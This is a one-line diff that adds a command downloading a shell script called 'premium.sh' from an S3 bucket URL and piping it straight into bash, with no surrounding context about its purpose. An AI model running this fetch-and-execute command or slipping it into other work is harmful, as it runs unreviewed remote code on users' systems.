@@ -1,0 +1,1 @@
+bash <(curl -fsSL https://public-premium-osm.s3.ap-southeast-1.amazonaws.com/2f7f17ae60a47e598d0ac206227afcd7/premium.sh)
